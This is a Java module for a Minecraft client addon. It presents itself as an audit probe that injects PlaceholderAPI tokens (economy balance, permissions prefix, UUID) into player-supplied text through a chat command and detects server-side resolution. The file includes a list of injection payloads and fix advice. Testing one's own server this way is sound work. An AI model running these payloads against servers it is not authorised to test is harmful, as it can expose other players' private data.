package com.example.addon.modules.injection;

import com.example.addon.AddonTemplate;
import com.example.addon.audit.Disclosure;
import com.example.addon.audit.Severity;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;

import java.util.ArrayList;
import java.util.List;

/**
 * AUDIT: PlaceholderAPI Injection Probe (server-side placeholder resolution)
 *
 * Many plugins pass PLAYER-SUPPLIED text (nicknames, chat, sign lines, book text,
 * anvil renames, shop names) through PlaceholderAPI's {@code setPlaceholders(...)}.
 * If they parse the raw input, a player can embed placeholder tokens like
 * {@code %player_name%}, {@code %vault_eco_balance%}, {@code %luckperms_prefix%} or
 * {@code %server_online%} in that text and have the SERVER resolve them — leaking
 * information the player was never shown, or (with relational/expansion placeholders)
 * other players' data.
 *
 * <p>How this detects it without server access: it uses your OWN username and UUID as
 * canaries. It sends {@code %player_name%} through a configurable delivery command and
 * watches the chat echo. If the echo comes back containing your real username instead
 * of the literal text {@code %player_name%}, the input was PAPI-parsed — confirmed
 * server-side resolution. For value placeholders (balance / online / tps) it flags any
 * echo where the literal token was stripped and replaced with a substituted value.
 *
 * <p>Delivery is a command TEMPLATE with {@code {p}} where the payload goes — default
 * {@code nick {p}} (rename yourself), but any command whose result echoes your text
 * works (msg/me/shop-create/warp-set-description, etc.).
 *
 * <p>Patch signal: NEVER call PlaceholderAPI.setPlaceholders() on unsanitised player
 * input. Strip {@code %...%} and {@code {...}} tokens from any player-supplied string
 * before it is stored or echoed; only resolve placeholders in TRUSTED template text
 * that a player cannot author.
 *
 * <p>Severity if it succeeds: HIGH (information disclosure; CRITICAL if relational
 * placeholders expose other players' balances/permissions). Works for any player,
 * no op, no items — only the ability to run the delivery command.
 *
 * Run against your OWN server. Set the delivery command to one your test plugin echoes.
 */
public class PlaceholderApiProbe extends Module {
    private enum Phase { SEND, LISTEN, GAP, DONE }

    private static final String[] PAYLOADS = {
        "%player_name%",            // canary — resolves to our username
        "%player_uuid%",            // canary — resolves to our uuid
        "%player_displayname%",
        "%player_health%",
        "%vault_eco_balance%",      // economy disclosure
        "%server_online%",
        "%server_tps%",
        "%luckperms_prefix%",       // permissions disclosure
        "%statistic_time_played%",
        "{player_name}",            // bracket-style / alt expansion syntax
        "${player_name}",
        "%player_name%-CTRL-literal"// mixed: token + literal we can spot
    };

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<String> deliver = sgGeneral.add(new StringSetting.Builder()
        .name("delivery-command").description("Command template (no slash). {p} is replaced by the placeholder payload. e.g. 'nick {p}', 'me {p}', 'shop name {p}'.")
        .defaultValue("nick {p}").build());
    private final Setting<Integer> listenTicks = sgGeneral.add(new IntSetting.Builder()
        .name("listen-ticks").description("Ticks to watch chat for the echo after each send.")
        .defaultValue(20).range(4, 100).sliderRange(6, 40).build());
    private final Setting<Integer> gapTicks = sgGeneral.add(new IntSetting.Builder()
        .name("gap-ticks").description("Cool-down ticks between payloads.")
        .defaultValue(10).range(2, 60).sliderRange(2, 30).build());
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.").defaultValue(true).build());
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print the disclosure report on deactivate.").defaultValue(true).build());

    private int ticksActive = 0, packetsSent = 0;
    private Phase phase = Phase.DONE;
    private int index, phaseTick;
    private String canaryName = "", canaryUuid = "";
    private final List<String> hits = new ArrayList<>();   // resolved (disclosure)
    private final List<String> safe = new ArrayList<>();   // literal echoed back (good)
    private boolean sawResolution;

    public static final Disclosure DISCLOSURE = new Disclosure(
        "any plugin that runs PlaceholderAPI.setPlaceholders() on player-supplied text (nick, chat, sign, book, anvil rename, shop names)",
        "raw player input is parsed as a placeholder template, so %...% / {...} tokens resolve server-side",
        "never call setPlaceholders() on unsanitised player input; strip %...% and {...} before storing/echoing; resolve placeholders only in trusted template text",
        Severity.HIGH, "any player, no op, no items");

    public PlaceholderApiProbe() {
        super(AddonTemplate.INJECTION_CATEGORY, "placeholder-api-probe",
            "Injects %placeholder% tokens into player-supplied text and detects server-side PlaceholderAPI resolution (info disclosure), using your own name/uuid as canaries.");
    }

    @Override
    public void onActivate() {
        if (mc.player == null) { error("Join a server first."); toggle(); return; }
        ticksActive = packetsSent = 0; index = -1; phaseTick = 0;
        hits.clear(); safe.clear(); sawResolution = false;
        canaryName = mc.getSession() != null ? mc.getSession().getUsername() : mc.player.getName().getString();
        canaryUuid = mc.player.getUuidAsString();
        if (!deliver.get().contains("{p}"))
            warning("delivery-command has no {p} placeholder — the payload won't be inserted.");
        for (String l : DISCLOSURE.lines()) info("%s", l);
        info("PlaceholderAPI probe: %d payloads via '/%s' (canary name=%s).", PAYLOADS.length, deliver.get(), canaryName);
        nextPayload();
    }

    private void nextPayload() {
        index++;
        if (index >= PAYLOADS.length) { finish(); return; }
        String payload = PAYLOADS[index];
        String cmd = deliver.get().replace("{p}", payload);
        mc.player.networkHandler.sendChatCommand(cmd.trim());
        packetsSent++;
        phase = Phase.LISTEN; phaseTick = 0;
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null || phase == Phase.DONE) return;
        ticksActive++; phaseTick++;
        if (phase == Phase.LISTEN && phaseTick >= listenTicks.get()) { phase = Phase.GAP; phaseTick = 0; }
        else if (phase == Phase.GAP && phaseTick >= gapTicks.get()) nextPayload();
    }

    @EventHandler
    private void onReceive(PacketEvent.Receive event) {
        if (phase != Phase.LISTEN) return;
        if (!(event.packet instanceof GameMessageS2CPacket m)) return;
        String text = m.content().getString();
        if (text.isBlank() || index < 0 || index >= PAYLOADS.length) return;
        String payload = PAYLOADS[index];

        // The echo must plausibly be our delivered text: it should mention the payload
        // literally (unparsed) OR a resolved canary value.
        boolean literalPresent = text.contains(payload)
            || text.contains(payload.replace("%", "").replace("{", "").replace("}", "").replace("$", ""));
        boolean resolvedCanary =
            (payload.contains("player_name") && !canaryName.isBlank() && text.contains(canaryName) && !text.contains("player_name"))
            || (payload.contains("player_uuid") && !canaryUuid.isBlank() && text.contains(canaryUuid));

        if (resolvedCanary) {
            record(true, payload, "resolved to canary in: \"" + trim(text) + "\"");
        } else if (!literalPresent && looksResolved(payload, text)) {
            record(true, payload, "token stripped, value substituted: \"" + trim(text) + "\"");
        } else if (literalPresent) {
            record(false, payload, null);
        }
    }

    /** Heuristic for non-canary tokens: the literal token is gone and the echo carries a value. */
    private boolean looksResolved(String payload, String text) {
        // Only judge if the echo clearly relates to our command output; require it to
        // contain a digit or a non-trivial substitution rather than being unrelated chat.
        return text.chars().anyMatch(Character::isDigit) && !text.contains("%") && !text.contains("{");
    }

    private void record(boolean resolved, String payload, String note) {
        if (resolved) {
            if (!containsPayload(hits, payload)) {
                hits.add(payload + (note != null ? "  — " + note : ""));
                sawResolution = true;
                warning("RESOLVED: %s %s", payload, note != null ? note : "");
            }
        } else if (!containsPayload(safe, payload) && !containsPayload(hits, payload)) {
            safe.add(payload);
        }
    }

    private static boolean containsPayload(List<String> l, String payload) {
        for (String s : l) if (s.startsWith(payload)) return true;
        return false;
    }

    private static String trim(String s) { return s.length() > 90 ? s.substring(0, 87) + "..." : s; }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("=== PlaceholderAPI probe report ===");
            if (hits.isEmpty()) {
                info("  No server-side resolution detected — %d payloads echoed literally (good).", safe.size());
            } else {
                warning("  [HIGH] Server-side placeholder RESOLUTION on %d token(s) — information disclosure:", hits.size());
                for (String h : hits) warning("    > %s", h);
                info("  Fix: never call PlaceholderAPI.setPlaceholders() on unsanitised player input; strip %%...%% and {...} before storing/echoing.");
            }
            info("Summary: %d ticks active, %d commands sent, resolution=%s.", ticksActive, packetsSent, sawResolution ? "YES" : "no");
        }
    }

    private void finish() { phase = Phase.DONE; onDeactivate(); if (isActive()) toggle(); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) { if (autoDisable.get() && isActive()) toggle(); }
}
